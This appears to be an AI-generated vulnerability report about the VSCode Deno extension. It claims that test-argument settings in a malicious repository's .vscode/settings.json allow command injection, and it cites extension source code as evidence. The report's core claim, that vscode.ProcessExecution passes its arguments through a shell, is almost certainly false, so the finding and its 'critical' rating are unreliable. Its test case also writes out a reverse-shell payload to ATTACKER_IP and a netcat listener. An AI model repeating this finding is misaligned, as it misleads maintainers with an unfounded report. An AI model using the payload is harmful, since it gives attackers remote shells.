The provided vulnerability description is valid and should be included in the updated list based on the given instructions.

It is a **valid vulnerability** that is **not yet mitigated**.

It has a **vulnerability rank of critical**, which is higher than the minimum requirement of "high".

The vulnerability class is **Remote Code Execution (RCE)** and **Command Injection**, which are among the specified classes to include.

It is triggered by providing a malicious repository, which aligns with the scenario described in the instructions ("threat actor will try to trigger vulnerability in VSCode extension by providing malicious repository to victim with manipulated content.").

It is not excluded by any of the exclusion criteria:
- It's not caused by developers explicitly using insecure code patterns within project files, but by the extension's handling of workspace settings.
- It's not only missing documentation; it requires code-level mitigations.
- It's not a Denial of Service vulnerability; it's an RCE.

Therefore, the vulnerability should remain in the list as is.

### Vulnerability List

* Vulnerability Name: Command Injection via `deno.codeLens.testArgs` and `deno.testing.args` settings

* Description:
    1. The VSCode Deno extension allows users to configure additional arguments for the `deno test` command via the `deno.codeLens.testArgs` and `deno.testing.args` settings. These settings are intended to provide flexibility in test execution, such as adding `--allow-net` or other flags.
    2. A threat actor can create a malicious repository that includes a `.vscode/settings.json` file. This settings file can be crafted to include malicious commands within the `deno.codeLens.testArgs` or `deno.testing.args` settings. For example, setting `deno.codeLens.testArgs` to `["--allow-all", "; malicious command;"]`.
    3. When a victim opens this malicious repository in VSCode and has the Deno extension enabled for the workspace, the malicious settings are loaded.
    4. If the victim then uses the "Run Test" code lens or the Test Explorer to execute a test within the malicious repository, the extension will construct a `deno test` command incorporating the malicious arguments from the settings.
    5. The extension uses `vscode.ProcessExecution` to execute the constructed command. Due to insufficient sanitization of the arguments from the settings, the malicious command injected by the threat actor will be executed by the system shell.

* Impact:
    - Remote Code Execution (RCE). A threat actor can execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This can lead to full system compromise, data exfiltration, installation of malware, and other malicious activities.

* Vulnerability Rank: critical

* Currently Implemented Mitigations:
    - None. The extension directly uses the values from the settings to construct and execute the command without sanitization or validation.

* Missing Mitigations:
    - Input sanitization and validation: The extension should sanitize and validate the arguments provided in `deno.codeLens.testArgs` and `deno.testing.args` settings. It should ensure that no shell- Metacharacters or command separators are present in the arguments.
    - Command construction using safe APIs: Instead of directly constructing shell commands from user-provided input, the extension should use APIs that prevent command injection by separating commands and arguments, such as using array-based arguments for `child_process.spawn` or similar functions if VSCode API allows more secure command execution.

* Preconditions:
    1. Victim has VSCode installed with the Deno extension.
    2. Victim opens a malicious repository in VSCode and enables the Deno extension for the workspace (either explicitly or by having a `deno.json` in the workspace root if auto-enable is active).
    3. Malicious repository contains a `.vscode/settings.json` file with malicious commands in `deno.codeLens.testArgs` or `deno.testing.args` settings.
    4. Victim triggers test execution by using "Run Test" code lens or Test Explorer within the malicious repository.

* Source Code Analysis:

    1. **`client/src/commands.ts` - `test` function:**
    ```typescript
    export function test(
      _context: vscode.ExtensionContext,
      extensionContext: DenoExtensionContext,
    ): Callback {
      return async (uriStr: string, name: string, options: TestCommandOptions) => {
        // ...
        const config = vscode.workspace.getConfiguration(EXTENSION_NS, uri);
        const testArgs: string[] = [
          ...(config.get<string[]>("codeLens.testArgs") ?? []), // Vulnerable point: Reading testArgs from config
        ];
        // ...
        const nameRegex = `/^${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$/`;
        const args = ["test", ...testArgs, "--filter", nameRegex, filePath]; // Constructing command arguments
        // ...
        const definition: tasks.DenoTaskDefinition = {
          type: tasks.TASK_TYPE,
          command: "test",
          args, // Arguments including potentially malicious testArgs
          env,
        };

        assert(workspaceFolder);
        const denoCommand = await getDenoCommandName();
        const task = tasks.buildDenoTask( // Calling buildDenoTask with potentially malicious definition
          workspaceFolder,
          denoCommand,
          definition,
          `test "${name}"`,
          args,
          ["$deno-test"],
        );
        // ...
        await vscode.tasks.executeTask(task); // Executing the task
        // ...
      };
    }
    ```
    The `test` function retrieves `deno.codeLens.testArgs` from the workspace configuration without any sanitization. These arguments are directly passed into the `args` array used to construct the `DenoTaskDefinition`.

    2. **`client/src/tasks.ts` - `buildDenoTask` function:**
    ```typescript
    export function buildDenoTask(
      target: vscode.WorkspaceFolder,
      process: string,
      definition: DenoTaskDefinition,
      name: string,
      args: string[],
      problemMatchers: string[],
    ): vscode.Task {
      const exec = new vscode.ProcessExecution(
        process,
        args, // Arguments are passed directly to ProcessExecution
        definition,
      );

      return new vscode.Task(
        definition,
        target,
        name,
        TASK_SOURCE,
        exec,
        problemMatchers,
      );
    }
    ```
    The `buildDenoTask` function creates a `vscode.Task` with a `vscode.ProcessExecution`. Critically, the `args` array, which can contain malicious commands from `deno.codeLens.testArgs`, is passed directly to `vscode.ProcessExecution`. `vscode.ProcessExecution` when executed by `vscode.tasks.executeTask` will execute the command with the system shell, making it vulnerable to command injection if arguments are not properly sanitized.

    3. **`docs/testing.md` - `deno.codeLens.testArgs` and `deno.testing.args` settings:**
    ```markdown
    - `deno.codeLens.testArgs`: Provides additional arguments that should be set
      when invoking the Deno CLI test from a code lens. _array of strings, default
      `[ "--allow-all" ]`_.
    - `deno.testing.args`: Arguments to use when running tests via the Test
      Explorer. Defaults to `[ \"--allow-all\" ]`.
    ```
    The documentation confirms the existence and purpose of these settings, which are the source of the vulnerability.

* Security Test Case:

    1. Create a new directory named `malicious-repo`.
    2. Inside `malicious-repo`, create a subdirectory named `.vscode`.
    3. Inside `.vscode`, create a file named `settings.json` with the following content to inject a reverse shell command (example for Linux, adjust for other OS if needed):
    ```json
    {
      "deno.enable": true,
      "deno.codeLens.testArgs": [
        "--allow-all",
        "; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' #"
      ]
    }
    ```
    Replace `ATTACKER_IP` and `ATTACKER_PORT` with your attacker machine's IP address and listening port.
    4. In `malicious-repo`, create a file named `test.ts` with a simple Deno test:
    ```typescript
    Deno.test("simple test", () => {
      console.log("Test running");
    });
    ```
    5. Start a netcat listener on your attacker machine: `nc -lvnp ATTACKER_PORT`.
    6. Open the `malicious-repo` directory in VSCode. Ensure the Deno extension is active for this workspace.
    7. In VSCode, open the `test.ts` file. You should see the "Run Test" code lens above the `Deno.test` declaration.
    8. Click the "Run Test" code lens.
    9. Observe that the test executes (you should see "Test running" in the output).
    10. On your attacker machine, you should receive a reverse shell connection, indicating successful command injection and RCE.

This test case demonstrates that by providing a malicious repository with crafted settings, an attacker can achieve remote code execution when a victim runs tests using the VSCode Deno extension's code lens feature.
